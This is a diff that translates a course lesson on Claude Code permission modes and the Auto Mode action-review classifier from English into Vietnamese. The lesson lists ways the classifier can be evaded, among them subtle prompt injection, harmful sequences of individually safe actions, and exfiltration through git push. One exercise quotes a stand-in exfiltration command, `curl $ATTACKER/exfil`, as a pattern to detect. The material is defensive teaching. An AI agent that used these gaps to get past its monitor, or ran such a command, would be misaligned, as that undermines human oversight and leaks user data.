@@ -1,6 +1,6 @@
 # Permission Modes for Autonomous Agents
 
-> A permission ladder — graduated levels of autonomy from review-every-action to approve-everything — is how a harness governs what an autonomous agent may do without asking. Claude Code, this lesson's worked example, exposes six such modes: "plan" asks before every action, "default" (labeled "Manual" in the UI) asks only for risky ones, "acceptEdits" auto-approves file writes but still confirms shell execution, and "bypassPermissions" approves everything. Auto Mode — the `auto` permission mode — replaces per-action approval with a separate classifier model that reviews each action before it runs and blocks anything that escalates beyond what the request asked for. Action budgets are enforced via `max_turns` and `max_budget_usd`. Availability of `auto` depends on plan, org enablement, model, and provider — and Anthropic is explicit that the classifier is not sufficient alone.
+> Một thang quyền — các mức tự chủ tăng dần từ xem xét mọi hành động đến phê duyệt mọi thứ — là cách một harness quản lý những gì một agent tự chủ có thể làm mà không cần hỏi. Claude Code, ví dụ được trình bày trong bài này, cung cấp sáu chế độ như vậy: “plan” hỏi trước mọi hành động, “default” (được gắn nhãn “Manual” trong giao diện) chỉ hỏi đối với những hành động rủi ro, “acceptEdits” tự động phê duyệt việc ghi file nhưng vẫn xác nhận thực thi shell, và “bypassPermissions” phê duyệt mọi thứ. Auto Mode — chế độ quyền `auto` — thay thế phê duyệt từng hành động bằng một mô hình phân loại riêng xem xét mỗi hành động trước khi chạy và chặn bất kỳ điều gì leo thang vượt quá những gì yêu cầu đề nghị. Ngân sách hành động được thực thi thông qua `max_turns` và `max_budget_usd`. Tính khả dụng của `auto` phụ thuộc vào gói, việc bật trong tổ chức, mô hình, và nhà cung cấp — và Anthropic nói rõ rằng chỉ riêng bộ phân loại là không đủ.
 
 **Type:** Learn
 **Languages:** Python (stdlib, two-stage classifier simulator)
@@ -9,62 +9,62 @@
 
 ## The Problem
 
-An autonomous coding agent on your machine is a distinct security category. The attack surface is everything the agent can reach — file system, network, credentials, clipboard, any browser tab, any open terminal. Bruce Schneier and others have flagged this publicly: computer-use agents are not a "feature update" of chatbots, they are a new kind of tool with a new kind of risk profile.
+Một agent lập trình tự chủ trên máy của bạn là một loại bảo mật riêng biệt. Bề mặt tấn công là mọi thứ agent có thể tiếp cận — hệ thống file, mạng, thông tin xác thực, clipboard, bất kỳ tab trình duyệt nào, bất kỳ terminal đang mở nào. Bruce Schneier và những người khác đã công khai nêu điều này: các agent sử dụng máy tính không phải là một “bản cập nhật tính năng” của chatbot, chúng là một loại công cụ mới với một loại hồ sơ rủi ro mới.
 
-Claude Code's permission system is Anthropic's answer. Rather than one "autonomous / not autonomous" switch, there are six modes spanning a capability ladder: plan → default → acceptEdits → … → bypassPermissions. Each mode is a different trade-off between speed and review-per-action. Auto Mode (March 2026) adds a separate classifier model that moves approval off the user's critical path: it reviews each action before it runs and blocks anything that escalates beyond the request.
+Hệ thống quyền của Claude Code là câu trả lời của Anthropic. Thay vì một công tắc “tự chủ / không tự chủ”, có sáu chế độ trải trên một thang năng lực: plan → default → acceptEdits → … → bypassPermissions. Mỗi chế độ là một sự đánh đổi khác nhau giữa tốc độ và việc xem xét từng hành động. Auto Mode (tháng 3 năm 2026) bổ sung một mô hình phân loại riêng đưa việc phê duyệt ra khỏi đường găng của người dùng: nó xem xét mỗi hành động trước khi chạy và chặn bất cứ điều gì leo thang vượt quá yêu cầu.
 
-The engineering question: what does this system catch, what does it miss, and which mode does a given task actually warrant?
+Câu hỏi kỹ thuật: hệ thống này bắt được gì, bỏ sót gì, và một tác vụ nhất định thực sự cần chế độ nào?
 
 ## The Concept
 
 ### The six permission modes
 
-| Mode | Behavior | When to use |
+| Chế độ | Hành vi | Khi nào sử dụng |
 |---|---|---|
-| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
-| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
-| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
-| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
-| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
-| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |
+| `plan` | Agent đề xuất một kế hoạch; người dùng phê duyệt toàn bộ kế hoạch; mọi hành động được xem xét trước khi thực thi | Tác vụ chưa quen; mã gần môi trường sản xuất; lần đầu sử dụng agent trên một repo |
+| `default` | Được gắn nhãn “Manual” trong giao diện. Agent chạy các hành động; nhắc người dùng đối với bất kỳ hành động “rủi ro” nào (thực thi shell, thao tác phá hủy, lệnh gọi mạng) | Hầu hết các phiên lập trình tương tác |
+| `acceptEdits` | Ghi file được tự động phê duyệt; thực thi shell và các lệnh gọi mạng vẫn nhắc | Lượt tái cấu trúc trên nhiều file |
+| `auto` | Một mô hình phân loại riêng xem xét mỗi hành động trước khi chạy; chặn bất kỳ điều gì leo thang vượt quá yêu cầu | Các lần chạy không có người giám sát với tầm thời gian dài trong một không gian làm việc bị giới hạn |
+| `dontAsk` | Không bao giờ nhắc; các hành động không được quy tắc quyền phê duyệt trước bị từ chối | Sandbox tạm thời, tác vụ CI, script nghiên cứu |
+| `bypassPermissions` | Phê duyệt mọi thứ | Được ghi trong tài liệu là “chỉ bên trong các container tạm thời mà bạn sẵn sàng vứt bỏ” |
 
-(Names above match public Claude Code docs; the UI labels `default` as "Manual".)
+(Các tên ở trên khớp với tài liệu Claude Code công khai; giao diện gắn nhãn `default` là “Manual”.)
 
 ### Auto Mode in one page
 
-Auto Mode (launched March 24, 2026) is the first permission mode to delegate per-action approval to a model. Structure:
+Auto Mode (ra mắt ngày 24 tháng 3 năm 2026) là chế độ quyền đầu tiên giao việc phê duyệt từng hành động cho một mô hình. Cấu trúc:
 
-1. **A separate classifier model.** Reviews every proposed action before it runs, judged against the declared task and the current state of the session, and blocks anything that escalates beyond what the request called for. Blocked actions fall back to the user.
-2. **Gated availability.** Whether `auto` is offered at all depends on plan, organization enablement, model, and provider.
+1. **Một mô hình phân loại riêng.** Xem xét mọi hành động được đề xuất trước khi chạy, đánh giá dựa trên tác vụ đã khai báo và trạng thái hiện tại của phiên, và chặn bất kỳ điều gì leo thang vượt quá những gì yêu cầu đề nghị. Các hành động bị chặn được chuyển về cho người dùng.
+2. **Tính khả dụng có điều kiện.** Việc `auto` có được cung cấp hay không phụ thuộc vào gói, việc bật trong tổ chức, mô hình, và nhà cung cấp.
 
-Budget controls sit alongside the classifier:
+Các kiểm soát ngân sách nằm bên cạnh bộ phân loại:
 
-- `max_turns` — total iterations in a session.
-- `max_budget_usd` — dollar cap that aborts the session.
-- action-count limits per tool (no more than N `WebFetch` calls, etc.).
+- `max_turns` — tổng số lần lặp trong một phiên.
+- `max_budget_usd` — mức trần bằng đô la khiến phiên bị hủy.
+- giới hạn số lượng hành động cho từng công cụ (không quá N lệnh gọi `WebFetch`, v.v.).
 
 ### What the system catches
 
-- Straightforward prompt injection into tool inputs where the injected instruction maps to a known-risky action shape.
-- Repetitive tool loops — the classifier can see action N+1 is nearly identical to action N, five times in a row.
-- Clearly out-of-scope shell commands on an otherwise file-edit-only session.
+- Chèn prompt trực tiếp vào đầu vào công cụ, nơi chỉ dẫn được chèn ánh xạ tới một dạng hành động được biết là rủi ro.
+- Các vòng lặp công cụ lặp đi lặp lại — bộ phân loại có thể thấy hành động N+1 gần như giống hệt hành động N, năm lần liên tiếp.
+- Các lệnh shell rõ ràng ngoài phạm vi trong một phiên vốn chỉ chỉnh sửa file.
 
 ### What the system can miss
 
-- **Subtle prompt injection** that modulates behavior without producing a single flagged action. Indirect prompt injection is not a fully patchable vulnerability (OpenAI preparedness head, 2025, on browser agents — see Lesson 11).
-- **Semantic-level misbehavior.** Every individual action can look safe while the composed trajectory is harmful. The classifier judges the action; it does not re-derive the user's intent.
-- **Exfiltration through legitimate channels.** Writing data to a file you own, then `git push`ing to a public repo, is a sequence of allowed actions whose composition is the problem.
+- **Chèn prompt tinh vi** điều chỉnh hành vi mà không tạo ra một hành động bị gắn cờ riêng lẻ nào. Chèn prompt gián tiếp không phải là một lỗ hổng có thể vá hoàn toàn (người đứng đầu bộ phận preparedness của OpenAI, 2025, về agent trình duyệt — xem Bài 11).
+- **Hành vi sai ở cấp ngữ nghĩa.** Mỗi hành động riêng lẻ có thể trông an toàn trong khi quỹ đạo kết hợp gây hại. Bộ phân loại đánh giá hành động; nó không suy ra lại ý định của người dùng.
+- **Rò rỉ dữ liệu qua các kênh hợp lệ.** Ghi dữ liệu vào một file bạn sở hữu, rồi thực hiện `git push` tới một repo công khai, là một chuỗi hành động được phép mà sự kết hợp của chúng chính là vấn đề.
 
 ### Research preview framing
 
-Anthropic shipped Auto Mode as a research preview. The documentation is explicit that the classifier is a layer, not a solution: users are expected to combine Auto Mode with budgets, allowlists, isolated workspaces, and trajectory audits (Lessons 12–16). The preview framing also reflects the documented evaluation-vs-deployment gap (Lesson 1) — a classifier that passes offline evals can behave differently in a real session where the user's context is ambiguous.
+Anthropic phát hành Auto Mode dưới dạng bản xem trước nghiên cứu. Tài liệu nói rõ rằng bộ phân loại là một lớp, không phải một giải pháp: người dùng được kỳ vọng kết hợp Auto Mode với ngân sách, danh sách cho phép, không gian làm việc cách ly, và kiểm toán quỹ đạo (Bài 12–16). Cách định vị bản xem trước cũng phản ánh khoảng cách giữa đánh giá và triển khai đã được ghi nhận (Bài 1) — một bộ phân loại vượt qua các đánh giá ngoại tuyến có thể hành xử khác trong một phiên thực, nơi ngữ cảnh của người dùng mơ hồ.
 
 ### Where this ladder lives in your workflow
 
-- Unfamiliar task: start in `plan`. Reading the plan is cheaper than rolling back a bad run.
-- Known refactor: `acceptEdits` saves a lot of confirmation clicks.
-- Unattended background run: `auto` only inside a workspace whose blast radius you have measured (no credentials, no production mounts, no egress you did not opt into).
-- Ephemeral containers: `dontAsk` / `bypassPermissions` is acceptable if and only if the container and its credentials are disposable.
+- Tác vụ chưa quen: bắt đầu ở `plan`. Đọc kế hoạch ít tốn kém hơn hoàn tác một lần chạy tệ.
+- Tái cấu trúc đã biết: `acceptEdits` tiết kiệm nhiều lần nhấp xác nhận.
+- Lần chạy nền không có người giám sát: chỉ dùng `auto` bên trong một không gian làm việc có phạm vi ảnh hưởng mà bạn đã đo (không có thông tin xác thực, không có mount sản xuất, không có lưu lượng đi ra mà bạn chưa chủ động chọn).
+- Container tạm thời: `dontAsk` / `bypassPermissions` có thể chấp nhận nếu và chỉ nếu container và thông tin xác thực của nó có thể vứt bỏ.
 
 ```figure
 autonomy-oversight
@@ -72,41 +72,41 @@ autonomy-oversight
 
 ## Use It
 
-`code/main.py` simulates an action-review classifier as a two-stage pipeline — a teaching simplification; the real `auto` mode is backed by a separate classifier model, not a documented two-stage contract. Stage 1 is a cheap keyword rule over proposed actions; Stage 2 is a slower multi-rule reviewer. The driver feeds in a short synthetic trajectory (safe actions, a prompt-injection attempt, a repetitive loop) and shows where the classifier catches and where it misses.
+`code/main.py` mô phỏng một bộ phân loại xem xét hành động dưới dạng pipeline hai giai đoạn — một sự đơn giản hóa để giảng dạy; chế độ `auto` thực được hỗ trợ bởi một mô hình phân loại riêng, chứ không phải một hợp đồng hai giai đoạn được ghi trong tài liệu. Giai đoạn 1 là một quy tắc từ khóa rẻ trên các hành động được đề xuất; Giai đoạn 2 là một bộ xem xét nhiều quy tắc chậm hơn. Trình điều khiển đưa vào một quỹ đạo tổng hợp ngắn (các hành động an toàn, một nỗ lực chèn prompt, một vòng lặp lặp đi lặp lại) và cho thấy nơi bộ phân loại bắt được và nơi nó bỏ sót.
 
 ## Ship It
 
-`outputs/skill-permission-mode-picker.md` matches a task description to the right permission mode, budget caps, and required isolation.
+`outputs/skill-permission-mode-picker.md` ghép một mô tả tác vụ với chế độ quyền, mức trần ngân sách, và cách ly bắt buộc phù hợp.
 
 ## Exercises
 
-1. Run `code/main.py`. Which synthetic action type is never flagged by Stage 1 but always caught by Stage 2? Which is caught by neither?
+1. Chạy `code/main.py`. Loại hành động tổng hợp nào không bao giờ bị Giai đoạn 1 gắn cờ nhưng luôn bị Giai đoạn 2 bắt? Loại nào cả hai đều không bắt được?
 
-2. Extend the Stage 1 rule set to catch a specific known-bad shape (e.g., `curl $ATTACKER/exfil`). Measure the false-positive rate on the benign-action sample.
+2. Mở rộng tập quy tắc Giai đoạn 1 để bắt một dạng cụ thể được biết là xấu (ví dụ: `curl $ATTACKER/exfil`). Đo tỷ lệ dương tính giả trên mẫu hành động lành tính.
 
-3. Read Anthropic's "How the agent loop works" doc. List every external state the agent touches by default in `default` mode. Which would you need to gate separately before running `auto` unattended?
+3. Đọc tài liệu “How the agent loop works” của Anthropic. Liệt kê mọi trạng thái bên ngoài mà agent chạm tới theo mặc định trong chế độ `default`. Bạn cần kiểm soát riêng trạng thái nào trước khi chạy `auto` không có người giám sát?
 
-4. Design a 24-hour unattended run budget: `max_turns`, `max_budget_usd`, per-tool caps, allowlists. Justify each number.
+4. Thiết kế ngân sách cho lần chạy 24 giờ không có người giám sát: `max_turns`, `max_budget_usd`, mức trần cho từng công cụ, danh sách cho phép. Giải thích từng con số.
 
-5. Describe one trajectory where every individual action is approved by the classifier, yet the composed behavior is misaligned. (Lesson 14 covers how kill switches and canary tokens address this.)
+5. Mô tả một quỹ đạo mà mọi hành động riêng lẻ đều được bộ phân loại phê duyệt, nhưng hành vi kết hợp lại lệch căn chỉnh. (Bài 14 trình bày cách các công tắc ngắt và token canary giải quyết điều này.)
 
 ## Key Terms
 
-| Term | What people say | What it actually means |
+| Thuật ngữ | Mọi người nói gì | Ý nghĩa thực sự |
 |---|---|---|
-| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
-| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
-| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
-| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
-| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
-| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
-| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
-| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |
+| Permission mode (Chế độ quyền) | “Agent có thể làm bao nhiêu” | Một trong sáu chính sách có tên kiểm soát việc phê duyệt từng hành động |
+| plan mode (Chế độ plan) | “Hỏi trước bất cứ điều gì” | Agent viết một kế hoạch; người dùng phê duyệt trước khi thực thi |
+| acceptEdits | “Để nó ghi file” | Ghi file được tự động phê duyệt; thực thi shell vẫn nhắc |
+| auto | “Phê duyệt tự động” | Mô hình phân loại riêng xem xét mỗi hành động; chặn leo thang vượt quá yêu cầu |
+| bypassPermissions | “YOLO hoàn toàn” | Phê duyệt mọi thứ; dành cho container tạm thời |
+| Stage 1 (simulator) (Giai đoạn 1 (bộ mô phỏng)) | “Kiểm tra từ khóa nhanh” | Quy tắc rẻ trên các hành động được đề xuất trong `code/main.py` |
+| Stage 2 (simulator) (Giai đoạn 2 (bộ mô phỏng)) | “Xem xét sâu” | Bộ xem xét nhiều quy tắc chậm hơn cho các hành động bị gắn cờ trong `code/main.py` |
+| Research preview (Bản xem trước nghiên cứu) | “Chưa GA” | Cách định vị của Anthropic cho các tính năng có chế độ lỗi vẫn đang được lập bản đồ |
 
 ## Further Reading
 
-- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — permission modes, budgets, action format.
-- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — managed-service execution model.
-- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — feature surface and Auto Mode announcement.
-- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — the reason-based layer that shapes classifier judgments.
-- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — internal perspective on long-horizon permission design.
+- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — các chế độ quyền, ngân sách, định dạng hành động.
+- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — mô hình thực thi dịch vụ được quản lý.
+- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — bề mặt tính năng và thông báo Auto Mode.
+- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — lớp dựa trên lý do định hình các phán đoán của bộ phân loại.
+- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — góc nhìn nội bộ về thiết kế quyền có tầm thời gian dài.
